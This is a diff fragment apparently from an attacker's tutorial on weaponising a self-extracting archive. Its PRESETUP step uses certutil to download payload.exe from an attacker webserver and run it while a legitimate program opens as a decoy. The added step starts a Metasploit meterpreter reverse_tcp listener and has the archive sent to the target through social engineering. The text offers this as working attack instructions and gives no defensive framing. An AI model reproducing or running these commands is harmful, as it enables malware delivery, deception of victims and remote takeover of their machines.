@@ -115,6 +115,9 @@
          script.bat (thats going to execute: any_file) => any_legit_appl.exe (to be executed as decoy)
          PRESETUP FUNTION => cmd.exe /c certutil -urlcache -split -f 'http://webserver/payload.exe', '%TEMP%/payload.exe'; Start-Process '%TEMP%/payload.exe'
 
+    6º - start a listenner, and send the sfx archive to target using social enginnering
+         msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.1.69; set lport 666; exploit'
+
     ╔────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╗
     |      When the sfx archive its executed, it will download payload.exe from our apache2 webserver to target and      |
     |  execute it before extract 'any_file' and 'any_legit_appl.exe' (this last one will be executed to serve as decoy)  |
